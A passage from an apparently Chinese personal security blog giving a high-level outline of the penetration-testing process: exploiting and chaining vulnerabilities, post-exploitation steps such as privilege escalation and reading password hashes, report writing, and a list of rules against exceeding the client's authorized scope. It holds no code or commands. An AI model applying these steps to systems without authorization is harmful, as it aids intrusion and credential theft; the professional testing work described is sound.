<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>尽可能的由浅入深，旁敲侧推，尽可能的将漏洞的价值发挥到最大化，比如说挖到一枚self-xss ，这个漏洞一般会被忽略，如果说结合csrf漏洞的话那么就是一个中危漏洞了<br>再比如说拿到一个企业的邮箱账户，我们可以对其vpn爆破然后进行内网探测等等都是可行的。</p>
<h2 id="后渗透测试"><a href="#后渗透测试" class="headerlink" title="后渗透测试"></a>后渗透测试</h2><p>这里所说的后渗透测试包括内网渗透，权限维持，权限提升，读取用户hash，浏览器密码等等。但是这里需要注意，是要在客户允许的范围内进行测试，注意底线！</p>
<h2 id="报告文档编写"><a href="#报告文档编写" class="headerlink" title="报告文档编写"></a>报告文档编写</h2><p>一个好的渗透测试报告至关重要。<br>只有编写完渗透测试报告这次渗透测试才算完全结束。<br>首先你需要明确漏洞名称以及漏洞原理。<br>其次要注明参与人员，测试时间，内网外网<br>在报告中具体阐述漏洞是如何产生的，如何利用的。最后应该给出详细的解决方案。</p>
<h2 id="风险规避"><a href="#风险规避" class="headerlink" title="风险规避"></a>风险规避</h2><ol>
<li>不要进行诸如ddos攻击，不破坏数据</li>
<li>测试之前对重要数据进行备份</li>
<li>任何测试执行前必须和客户进行沟通，以免引来不必要的麻烦</li>
<li>可以对原始系统生成镜像环境，然后对镜像环境进行测试</li>
<li>明确渗透测试范围</li>
</ol>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>绿盟技术博客<a href="http://blog.nsfocus.net/penetration-testing-process-talk-about/" target="_blank" rel="noopener">http://blog.nsfocus.net/penetration-testing-process-talk-about/</a></p>
<p>米斯特白帽培训讲义<a href="https://github.com/wizardforcel/mst-sec-lecture-notes" target="_blank" rel="noopener">https://github.com/wizardforcel/mst-sec-lecture-notes</a></p>

            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">uaa</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://827607240.github.io/2020/09/10/shen-tou-ce-shi/">https://827607240.github.io/2020/09/10/shen-tou-ce-shi/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">uaa</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/web/">
                                    <span class="chip bg-color">web</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'zJq4EoET2FEb1trGzTayy1uq-gzGzoHsz',
        appKey: 'oFcTVTBJYrfsIGdYNnoWMVJ9',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2020/10/10/RDP-CVE-2019-0708/">
                    <div class="card-image">
                        
                        <img src="https://s1.ax1x.com/2020/10/11/0cdmcR.md.jpg" class="responsive-img" alt="RDP_CVE-2019-0708">
                        
                        <span class="card-title">RDP_CVE-2019-0708</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            CVE-2019-0708漏洞复现漏洞简述Remote Desktop Services，在Windows Server 2008及更早版本中称为终端服务，是Microsoft Windows的一个组件，允许用户通过网络连接控制远程计算机或
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2020-10-10
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            uaa
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/cve/">
                        <span class="chip bg-color">cve</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2020/09/09/Hydra/">
                    <div class="card-image">
                        
                        <img src="https://www.seekpng.com/png/detail/178-1780956_hydra-logo-png-hydra-e-sport.png" class="responsive-img" alt="爆破密码工具Hydra学习总结">
                        
                        <span class="card-title">爆破密码工具Hydra学习总结</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            爆破密码工具Hydra学习总结hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码。九头蛇是一个并发的登录破解程序，支持许多协议攻击。新模块更容易添加，除此之外，Hydra非常灵活和迅速的。这款暴力密码破解工具相
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-09
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            uaa
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Hydra/">
                        <span class="chip bg-color">Hydra</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: wiki<br />'
            + '文章作者: uaa<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块折行 -->

<style type="text/css">
code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
</style>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4, h5, h6'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4, h5, h6').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            <span id="year">2020</span>
            <a href="/about" target="_blank">uaa</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">59.4k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2020";
                    var startMonth = "1";
                    var startDate = "1";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">














</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/search.xml", 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
